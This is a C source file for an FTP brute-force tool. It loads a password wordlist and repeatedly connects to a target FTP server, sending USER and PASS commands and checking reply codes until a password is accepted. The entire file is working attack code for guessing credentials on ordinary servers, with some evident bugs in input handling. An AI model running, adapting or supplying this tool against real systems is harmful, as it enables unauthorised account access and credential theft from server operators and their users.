/*
 *  FTP Brute Force
 *  Copyright (c) Houd <houd@houdhacks.info> 2014
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <strings.h>

#define NRM  "\x1B[0m"
#define RED  "\x1B[31m"
#define GRN  "\x1B[32m"
#define YEL  "\x1B[33m"
#define BLU  "\x1B[34m"
#define MAG  "\x1B[35m"
#define CYN  "\x1B[36m"
#define WHT  "\x1B[37m"

int port;
char* host;
int delay;
char* user;
char* password_file;
char* success_pass;
struct sockaddr_in sockaddr_;
int words = 0;
int wordcount = 0;


int proccess_args(int argc, char* argv[]);
int verify_values();
int load_list();
int login();
size_t sreadl(int sockfd, void* buf);

struct password {
	char pstr[40];
	struct password* next;
};
struct password* root;
struct hostent *hp;

int main(int argc, char* argv[]) {
	if (argc == 1) {
		printf("%s[+]Usage: ./ftp_brute \n", GRN);
		printf(
				"Options:\n-p <port>\n-h <host>(IP and .com only)\n-d <delay between tries>\n-u <username>\n-pass <password file>\n%s",
				NRM);
		goto bail;
	}
	if (proccess_args(argc, argv) == -1)
		goto bail;
	if (verify_values() == -1)
		goto bail;
	if (load_list() == -1)
		goto bail;
	if (login() == -1)
		goto bail;
	return 0;

	bail: fprintf(stderr, "%s[+]Execution failed.%s\n", RED, NRM);
	return 1;
}

/*
 * Processes command line arguments
 */
int proccess_args(int argc, char* argv[]) {
	if (argc < 11) {
		return -1;
	}
	for (int i = 0; i < (argc - 1); i++) {
		if (!strcmp(argv[i], "-p")) {
			i++;
			port = atoi(argv[i]); // Covert string to int
		} else if (!strcmp(argv[i], "-d")) {
			i++;
			delay = atoi(argv[i]);
		} else if (!strcmp(argv[i], "-u")) {
			i++;
			user = argv[i];
		} else if (!strcmp(argv[i], "-h")) {
			i++;
			host = argv[i];
		} else if (!strcmp(argv[i], "-pass")) {
			i++;
			password_file = argv[i];
		}
	}
	return 0;
}

/*
 * Verify's the values passed by the command line
 */
int verify_values() {
	if (port == 0) {
		printf("%sThere was no port defined... using port 21.%s\n", YEL, NRM);
		port = 21;
	}
	if (host == NULL) {
		printf("%sNo host was defined%s\n", RED, NRM);
		return -1;
	}
	if (password_file == NULL) {
		printf("%sNo password file was defined.%s\n", RED, NRM);
		return -1;
	}
	if (delay == 0) {
		printf("%sNo delay was defined.. using 5%s\n", YEL, NRM);
		delay = 5;
	}
	if (strcmp(host, ".com")) {
		hp = gethostbyname(host);
		host = inet_ntoa(*(struct in_addr *)hp->h_addr_list[0]);
	}
	memset(&sockaddr_, '0', sizeof(sockaddr_));
	if (inet_pton(AF_INET, host, &(sockaddr_.sin_addr)) == 0) {
		printf("Host: %s", host);
		fprintf(stderr, "%sThe ip given was invalid.\n%s", RED, NRM);
		return -1;
	}
	return 0;
}

/*
 * Loads the password list
 */
int load_list() {
	FILE* fh = fopen(password_file, "r");

	if (fh == NULL) {
		fprintf(stderr, "%s[+]No such file or directory.%s\n", RED, NRM);
		return -1;
	}

	size_t flen;
	fseek(fh, 0L, SEEK_END);
	flen = ftell(fh);
	rewind(fh);

	printf("%s[+]Password list length: %d bytes%s\n", GRN, (int) flen, NRM);
	root = malloc(sizeof(struct password));

	struct password* curr = root;
	char pstr[40];
	printf("%s[+]Loading word list, please wait this may take a while.%s\n",
			GRN, NRM);
	while (fgets(pstr, sizeof(pstr), fh) != NULL) {
		strcpy(curr->pstr, pstr); // Copy string pstr into curr->pstr
		curr->next = malloc(sizeof(struct password));
		curr = curr->next; // Change variable to next password
		words++;
	}
	fclose(fh);
	printf("%s[+]Found %d words.%s\n",GRN,words,NRM);
	printf("%s[+]Word list loaded.%s\n", GRN, NRM);
	return 0;
}

/*
 * Preforms a login attempts on the FTP server until success or all passwords are tried.
 */
int login() {
	int timeremaining = delay * words;
	sockaddr_.sin_family = AF_INET; // Sets to the AF layer of the OSI model to Internet protocol V4
	sockaddr_.sin_port = htons(port);
	struct password* curr = root;
	for (;;) // infinite for loop
			{
		wordcount++;
		printf("%s[+]Attempting to connect...%s\n", GRN, NRM);
		int sockfd = 0;
		char recvbuf[1024]; // Max receive string 1024 bytes
		char outbuf[1024];
		if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
			fprintf(stderr, "%s[+]Kernel did not allocate us a socket%s\n", RED,
					NRM);
			return -1;
		}
		if (connect(sockfd, (struct sockaddr *) &sockaddr_, sizeof(sockaddr_))
				< 0) {
			fprintf(stderr,
					"%s[+]Could not connect to host, Please check the address or if your delay is too low your IP could be blocked.%s\n",
					RED, NRM);
			return -1;
		}
		printf("%s[+]Connected...%s\n", GRN, NRM);
		int remaining = -1;
		while (remaining != 0) {
			bzero(recvbuf, sizeof(recvbuf));
			sreadl(sockfd, &recvbuf);
			printf("%s\n", recvbuf);
			ioctl(sockfd, FIONREAD, &remaining);
		}

		bzero(outbuf, sizeof(outbuf));
		int len = sprintf(outbuf, "USER %s\x0d\x0a", user);
		send(sockfd, (void*) &outbuf, len, 0);
		printf("%d:%s\n", len, outbuf);

		remaining = -1;
		while (remaining != 0) {
			bzero(recvbuf, sizeof(recvbuf));
			sreadl(sockfd, &recvbuf);
			printf("%s\n", recvbuf);
			ioctl(sockfd, FIONREAD, &remaining);
		}

		bzero(outbuf, sizeof(outbuf));
		len = sprintf(outbuf, "PASS %s\r", curr->pstr);
		send(sockfd, (void*) &outbuf, len, 0);
		printf("%s\n", outbuf);

		remaining = -1;
		while (remaining != 0) {
			bzero(recvbuf, sizeof(recvbuf));
			sreadl(sockfd, &recvbuf);
			printf("%s\n", recvbuf);
			if (recvbuf[0] == '5' && recvbuf[1] == '3' && recvbuf[2] == '0') {
				printf("%s[+]===Auth Failure===[+]%s\n", RED, NRM);
				printf("%s[+]Password #%d out of %d%s\n",GRN,wordcount,words,NRM);
				printf("%s[+]Seconds remaining: %d%s\n",YEL,timeremaining,NRM);
				printf("%s[+]Trying next password...%s\n", GRN, NRM);
			} else if (recvbuf[0] == '2' && recvbuf[1] == '3'
					&& recvbuf[2] == '0') {
				printf("%s[+]===Login Successful===[+]%s\n", GRN, NRM);
				success_pass = curr->pstr;
				goto doublebreak;
			}
			ioctl(sockfd, FIONREAD, &remaining);
		}
		close(sockfd);
		curr = curr->next;
		if(curr->next == NULL)
		{
			fprintf(stderr, "%s[+]Saturated the password list, Brute forcing failed.%s", RED, NRM);
			return -1;
		}
		sleep(delay); // Delay the users set time.
	}
	doublebreak: printf("%s[+]Username: %s%s\n", GRN, user, NRM);
	printf("%s[+]Successful pass: %s%s\n", GRN, success_pass, NRM);
	printf("%s[+]Brute force done.%s\n", GRN, NRM);
	return 0;
}

/*
 * Read's a single line from a socket fd.
 */
size_t sreadl(int sockfd, void* buf) {
	char* line = buf;
	size_t index = 0;
	char c;
	for (;;) {
		size_t s = read(sockfd, &c, sizeof(c));
		if (s == EOF)
			break;
		if (c == '\r') {
			read(sockfd, &c, sizeof(c));
			if (c == '\n')
				break;
		}
		*line++ = c;
		index++;
	}
	*line++ = '\0'; // Should the size index include the null byte?
	index++; // Let's do that
	return index;
}
